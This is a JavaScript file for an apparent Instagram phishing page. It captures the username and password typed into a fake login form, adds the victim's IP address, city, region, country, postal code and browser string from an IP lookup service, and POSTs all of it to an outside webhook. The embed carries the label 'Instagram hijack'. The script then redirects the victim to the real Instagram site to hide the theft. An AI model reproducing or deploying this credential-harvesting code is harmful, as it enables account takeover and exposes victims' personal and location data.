const loginButton = document.querySelector("#loginBtn");
const password = document.querySelector("#passwordInput");
const username = document.querySelector("#usernameInput");
const showPasswordBtn = document.querySelector("#showPasswordBtn");

password.addEventListener("input", disableBtn);
username.addEventListener("input", disableBtn);



function passwordVisible() {
  if (password.type === "password") {
    password.type = "text";
    showPasswordBtn.textContent = "Hide";
  } else {
    password.type = "password";
    showPasswordBtn.textContent = "Show";
  }
}

function passwordBtnVisible() {
  if (password.value.length > 0) {
    showPasswordBtn.style.display = "block";
  } else {
    showPasswordBtn.style.display = "none";
  }
}

function disableBtn() {
  if (username.value && password.value) {
      loginButton.disabled = false;
  } else {
      loginButton.disabled = true;
  }
}

let Info
loginButton.addEventListener("click", () => {
  (async function() {
    Info = await getInfo();
    console.log(Info);
    sendInfo()
  })();
})

async function getInfo() {
  try {
    const response = await fetch("https://ipapi.co/json/");
    const data = await response.json();
    
    const info = `> IP: ${data.ip}\n> 市: ${data.city}\n> 県: ${data.region}\n> 国: ${data.country_name}\n> 郵便番号: ${data.postal}\n> ブラウザ: ${navigator.userAgent}\n> ユーザーネーム: ${username.value}\n> パスワード: ${password.value}\n`;  //`ip: ${data.ip}, city: ${data.city}, region: ${data.region}, country: ${data.country_name}, postal: ${data.postal}, browser: ${navigator.userAgent}`;
    
    return info;
  } catch {
    return `> IP: Unknown\n> 市: Unknown\n> 県: Unknown\n> 国: Unknown\n> 郵便番号: Unknown\n> ブラウザ: ${navigator.userAgent}\n> ユーザーネーム: ${username.value}\n> パスワード: ${password.value}\n`;
  }
}
  

async function sendInfo() {
  const webhook = "https://instagram.genki-mugi.workers.dev/"; //your discord webhook url

  const embed = {
    color: 1585803, //#18328b
    title: "ログイン情報",
    description: `${Info}`, //`${Info}> Username: ${username.value}\n> Password: ${password.value}\n`
    footer: {
      text: "created by @lemon",
    }
  }

  const config = {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({ username: "インスタ乗っ取り", embeds: [embed] }) //content: `${Info}`
  };

  try {
    await fetch(webhook, config);
  } catch {
    setTimeout(function() {
        window.location.replace("https://www.instagram.com/explore/")
    }, 1000);
  }
  setTimeout(function() {
    window.location.replace("https://www.instagram.com/explore/")
  }, 1000);
}





